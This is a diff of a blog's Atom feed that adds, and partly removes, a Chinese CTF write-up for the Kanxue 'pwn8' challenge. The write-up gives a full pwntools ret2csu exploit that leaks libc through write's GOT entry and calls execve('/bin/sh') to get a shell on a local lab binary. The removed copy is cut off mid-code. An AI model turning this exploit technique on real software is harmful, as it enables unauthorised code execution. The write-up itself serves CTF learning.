+        <link rel="alternate" href="https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/"/>
+        <content type="html">&lt;h3 id=&#34;查看程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看程序&#34;&gt;#&lt;/a&gt; 查看程序&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/1ed670b5ceeb462994b707ec5fcfcfef.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;64位程序开启了nx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64位程序开启了nx&#34;&gt;#&lt;/a&gt; 64 位程序，开启了 NX&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/9c917aba36be440a838d8ac8b70a0c2d.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;有溢出漏洞， &lt;strong&gt;变量为 char 型变量&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/72ef02703ac246488cecade776d65acd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;没有后门函数， 那就 &amp;lt;font color=red&amp;gt; 去 libc 中找 execve 地址执行 &amp;lt;/font&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/d4fe1b33d8224911a9d218d861317b60.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;偏移量为 136&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;write：write(1，输出地址，输出字节数)      
+             write(1,write_got,8)                
+read：read(0,写入地址，写入字节数)
+             read(0,bss_base,16)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./pwn8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./pwn8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;write&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;read&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;read&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symbols&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;main&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bss_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bss&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x000400606&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x0004005F0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;csu&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;last&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;136&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;csu1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;csu2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#加 8 个 a 是因为 csu1 里先执行 add rsp，8   ，意味着将栈变长了八字节，要填充才能到后面&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;last&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;#56 是将 add rsp，8 以及之后的总共 7 行全覆盖掉 7*8，前面已经给 rdx,rsi,edi 赋值了，再改变也没有影响&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#不能用 sendline，会出错&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;write_really&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;LibcSearcher&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write_really&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;write_really&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;write&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;execve&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;execve&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;execve&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;/bin/sh\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#bss_base 相当于是 execve 的地址，bss_base+8 是到了 execve 的参数 &#34;/bin/sh\x00&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/c98c4ed447994c66ac1d2bfc64b9f3c0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;参考链接 ret2csu：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9ESXFZdg==&#34;&gt;http://t.csdn.cn/DIqYv&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="pwn" />
+        <category term="ret2csu" />
         <category term="ctf" />
         <updated>2023-05-04T11:33:55.000Z</updated>
     </entry>
@@ -999,33 +1028,6 @@ int execve(const char *filename, char *const argv[], char *const envp[]);
         <category term="ret2csu" />
         <category term="ctf" />
         <category term="系统调用" />
-        <updated>2023-05-04T11:33:55.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/</id>
-        <title>看雪社区pwn8（64位构造通用ROP，ret2csu）</title>
-        <link rel="alternate" href="https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/"/>
-        <content type="html">&lt;h3 id=&#34;查看程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看程序&#34;&gt;#&lt;/a&gt; 查看程序&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/1ed670b5ceeb462994b707ec5fcfcfef.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;64位程序开启了nx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64位程序开启了nx&#34;&gt;#&lt;/a&gt; 64 位程序，开启了 NX&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/9c917aba36be440a838d8ac8b70a0c2d.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;有溢出漏洞， &lt;strong&gt;变量为 char 型变量&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/72ef02703ac246488cecade776d65acd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;没有后门函数， 那就 &amp;lt;font color=red&amp;gt; 去 libc 中找 execve 地址执行 &amp;lt;/font&amp;gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/d4fe1b33d8224911a9d218d861317b60.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;偏移量为 136&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;write：write(1，输出地址，输出字节数)      
-             write(1,write_got,8)                
-read：read(0,写入地址，写入字节数)
-             read(0,bss_base,16)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;exp：&lt;/p&gt;
-&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./pwn8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./pwn8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;write&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;read&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token 